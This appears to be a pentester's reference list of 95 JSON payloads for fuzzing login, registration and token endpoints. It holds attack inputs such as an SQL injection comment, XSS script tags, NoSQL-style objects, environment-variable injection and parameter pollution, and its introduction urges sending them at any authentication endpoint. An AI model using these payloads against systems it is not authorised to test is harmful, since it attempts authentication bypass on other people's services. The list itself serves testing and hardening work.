# 24. API Authentication — 95 JSON Test Payloads

Original PDF source: [97 JSON Tests for Authentication Endpoints](https://www.linkedin.com/feed/update/urn:li:activity:7097279293608607746/)

The list below is a fuzzing menu. Send each variant against any JSON authentication endpoint, especially `/login`, `/register`, `/reset`, `/oauth/token`, GraphQL mutation endpoints, and internal admin APIs. Watch for: unexpected `200 OK`, different response length, error stack traces, type-juggling auth bypass, NoSQL operator injection, prototype pollution, mass assignment, and HPP behaviour.

---

## 1. Plain credentials

```
{
"login": "admin",
"password": "admin"
}
```

## 2. Empty credentials

```
{
"login": "",
"password": ""
}
```

## 3. Null values

```
{
"login": null,
"password": null
}
```

## 4. Numeric credentials

```
{
"login": 123,
"password": 456
}
```

## 5. Boolean credentials

```
{
"login": true,
"password": false
}
```

## 6. Credentials as arrays

```
{
"login": ["admin"],
"password": ["password"]
}
```

## 7. Credentials as objects (NoSQL operator injection style)

```
{
"login": {"username": "admin",
"password": {"password": "password"}}
}
```

## 8. Special characters

```
{
"login": "@dm!n",
"password": "p@ssw0rd#"
}
```

## 9. SQL Injection

```
{
"login": "admin' --",
"password": "password"
}
```

## 10. HTML tags in credentials

```
{
"login": "<h1>admin</h1>",
"password": "ololo-HTML-XSS"
}
```

## 11. Unicode-escaped credentials

```
{
"login": "\u0061\u0064\u006D\u0069\u006E",
"password":"\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064"
}
```

## 12. Escape characters in credentials

```
{
"login": "ad\\nmin",
"password": "pa\\ssword"
}
```

## 13. Whitespace-only credentials

```
{
"login": " ",
"password": " "
}
```

## 14. Extremely long values

```
{
"login": "a"*10000,
"password": "b"*10000
}
```

## 15. Malformed JSON (missing closing brace)

```
{
"login": "admin",
"password": "admin"
```

## 16. Malformed JSON (trailing comma)

```
{
"login": "admin",
"password": "admin",
}
```

## 17. Missing the `login` key

```
{
"password": "admin"
}
```

## 18. Missing the `password` key

```
{
"login": "admin"
}
```

## 19. Swapped key and value

```
{
"admin": "login",
"password": "password"
}
```

## 20. Extra keys

```
{
"login": "admin",
"password": "admin",
"extra": "extra"
}
```

## 21. Missing colon

```
{
"login" "admin",
"password": "password"
}
```

## 22. Invalid booleans as credentials

```
{
"login": yes,
"password": no
}
```

## 23. Empty keys and empty values

```
{
"": "",
"": ""
}
```

## 24. Nested objects

```
{
"login": {"innerLogin": "admin",
"password": {"innerPassword": "password"}}
}
```

## 25. Case-sensitivity test

```
{
"LOGIN": "admin",
"PASSWORD": "password"
}
```

## 26. Numeric login, string password

```
{
"login": 1234,
"password": "password"
}
```

## 27. String login, numeric password

```
{
"login": "admin",
"password": 1234
}
```

## 28. Duplicate keys

```
{
"login": "admin",
"login": "user",
"password": "password"
}
```

## 29. Single quotes (`'`) instead of double quotes (`"`)

```
{
'login': 'admin',
'password': 'password'
}
```

## 30. Login and password using only special characters

```
{
"login": "@#$%^&*",
"password": "!@#$%^&*"
}
```

## 31. Unicode escape sequence

```
{
"login": "\u0041\u0044\u004D\u0049\u004E",
"password":"\u0050\u0041\u0053\u0053\u0057\u004F\u0052\u0044"
}
```

## 32. Object value instead of a string (Mongo / BSON-style)

```
{
"login": {"$oid":
"507c7f79bcf86cd7994f6c0e"},
"password": "password"}
}
```

## 33. `undefined` as a value

```
{
"login": undefined,
"password": undefined
}
```

## 34. Extra nested objects

```
{
"login": "admin",
"password": "password",
"extra": {"key1": "value1",
"key2": "value2"}
}
```

## 35. Hexadecimal values

```
{
"login": "0x1234",
"password": "0x5678"
}
```

## 36. Extra symbols after valid JSON

```
{
"login": "admin",
"password": "password"}@@@@@@
}
```

## 37. Missing values

```
{
"login":,
"password":
}
```

## 38. Embedded control characters

```
{
"login": "ad\u0000min",
"password": "pass\u0000word"
}
```

## 39. Long Unicode string

```
{
"login": "\u0061"*10000,
"password": "\u0061"*10000
}
```

## 40. `\n` characters (forces a line break)

```
{
"login": "ad\nmin",
"password": "pa\nssword"
}
```

## 41. `\t` characters (tab)

```
{
"login": "ad\tmin",
"password": "pa\tssword"
}
```

## 42. HTML tag injection

```
{
"login": "<b>admin",
"password": "password"
}
```

## 43. JSON-in-JSON injection

```
{
"login": "{\"injection\":\"value\"}",
"password": "password"
}
```

## 44. XML-in-JSON

```
{
"login": "<b>admin",
"password": "password"
}
```

## 45. Mix of digits, strings and special characters

```
{
"login": "ad123min!@",
"password": "pa55w0rd!@"
}
```

## 46. Environment variable injection

```
{
"login": "${USER}",
"password": "${PASS}"
}
```

## 47. Backslash (`\`) character

```
{
"login": "ad\\min",
"password": "pa\\ssword"
}
```

## 48. Long string of special characters

```
{
"login": "!@#$%^&*()"*1000,
"password": "!@#$%^&*()"*1000
}
```

## 49. Empty key

```
{
"": "admin",
"password": "password"
}
```

## 50. JSON injection inside the key

```
{
"{\"injection\":\"value\"}": "admin",
"password": "password"
}
```

## 51. Embedded `"` (quoted credentials)

```
{
"login": "\"admin\"",
"password": "\"password\""
}
```

## 52. Credentials as nested arrays

```
{
"login": [["admin"]],
"password": [["password"]]
}
```

## 53. Credentials as deeply-nested objects

```
{
"login": {"username": {"value": "admin",
"password": {"password": {"value": "password"
}
```

## 54. Numeric keys

```
{
123: "admin",
456: "password"
}
```

## 55. Greater-than / less-than (`>` / `<`) characters in credentials

```
{
"login": "admin>1",
"password": "<password"
}
```

## 56. Parentheses in credentials

```
{
"login": "(admin)",
"password": "(password)"
}
```

## 57. Credentials containing `/`

```
{
"login": "admin/user",
"password": "pass/word"
}
```

## 58. Credentials mixing many data types

```
{
"login": ["admin",
123,
true,
null,
{"username": ["admin"],
"password": ["password",
123,
false,
null,
{"password": "password"]}}
}
```

## 59. Escape sequences in values

```
{
"login": "admin\\r\\n\\t",
"password": "password\\r\\n\\t"
}
```

## 60. Curly braces in values

```
{
"login": "{admin}",
"password": "{password}"
}
```

## 61. Square brackets in values

```
{
"login": "[admin]",
"password": "[password]"
}
```

## 62. Only special characters

```
{
"login": "!@#$$%^&*()",
"password": "!@#$$%^&*()"
}
```

## 63. Control characters

```
{
"login": "admin\b\f\n\r\t\v\0",
"password": "password\b\f\n\r\t\v\0"
}
```

## 64. Null character

```
{
"login": "admin\0",
"password": "password\0"
}
```

## 65. Scientific-notation numbers as strings

```
{
"login": "1e5",
"password": "1e10"
}
```

## 66. Hexadecimal numbers

```
{
"login": "0xabc",
"password": "0x123"
}
```

## 67. Leading zeros

```
{
"login": "000123",
"password": "000456"
}
```

## 68. Multi-language input (e.g. English + Korean)

```
{
"login": "admin관리자",
"password": "password비밀번호"
}
```

## 69. Extremely long keys

```
{
"a"*10000: "admin",
"b"*10000: "password"
}
```

## 70. Extremely long Unicode values

```
{
"login": "\u0061"*10000,
"password": "\u0062"*10000
}
```

## 71. Semicolons in values

```
{
"login": "admin;",
"password": "password;"
}
```

## 72. Backticks (`` ` ``) in values

```
{
"login": "`admin`",
"password": "`password`"
}
```

## 73. `+` sign in values

```
{
"login": "admin+",
"password": "password+"
}
```

## 74. `=` sign in values

```
{
"login": "admin=",
"password": "password="
}
```

## 75. `*` (wildcard) in values

```
{
"login": "admin*",
"password": "password*"
}
```

## 76. JavaScript code in values (XSS / template-injection probe)

```
{
"login": "admin<script>alert('hi')</script>",
"password": "password"
}
```

## 77. Negative numbers

```
{
"login": "-123",
"password": "-456"
}
```

## 78. URLs as values

```
{
"login": "https://admin.com",
"password": "https://password.com"
}
```

## 79. Email-formatted values

```
{
"login": "admin@admin.com",
"password": "password@password.com"
}
```

## 80. IP-address-formatted values

```
{
"login": "192.0.2.0",
"password": "203.0.113.0"
}
```

## 81. Date-formatted values

```
{
"login": "2023-08-03",
"password": "2023-08-04"
}
```

## 82. Scientific-notation numbers as native numbers

```
{
"login": 1e+30,
"password": 1e+30
}
```

## 83. Negative scientific notation

```
{
"login": -1e+30,
"password": -1e+30
}
```

## 84. Zero-Width Space (U+200B)

```
{
"login": "admin​",
"password": "password​"
}
```

## 85. Zero-Width Joiner (U+200D)

```
{
"login": "admin‍",
"password": "password‍"
}
```

## 86. Very large integers (numeric-overflow probe)

```
{
"login": 12345678901234567890,
"password": 12345678901234567890
}
```

## 87. Backspace (`\b`)

```
{
"login": "admin\b",
"password": "password\b"
}
```

## 88. Emoji values

```
{
"login": "admin😀",
"password": "password😀"
}
```

## 89. JSON with comments (not officially supported by JSON)

```
{
/*"login": "admin",
"password": "password"*/
}
```

## 90. Base64-encoded values

```
{
"login": "YWRtaW4=",
"password": "cGFzc3dvcmQ="
}
```

## 91. Null byte (can crash some parsers)

```
{
"login": "admin\0",
"password": "password\0"
}
```

## 92. Scientific-notation credentials

```
{
"login": 1e100,
"password": 1e100
}
```

## 93. Octal-escaped values

```
{
"login": "\141\144\155\151\156",
"password":"\160\141\163\163\167\157\162\144"
}
```

## 94. Wrapped (root-element) JSON — writeup pattern

```
{
root:{
"username": "admin",
"password":"admin"
}
}
```

## 95. HTTP Parameter Pollution / array-indexing tricks — writeup pattern

```
basic        => username=admin
username[]=admin
username[0]=admin
username=admin&username=admin
delete username=admin
```
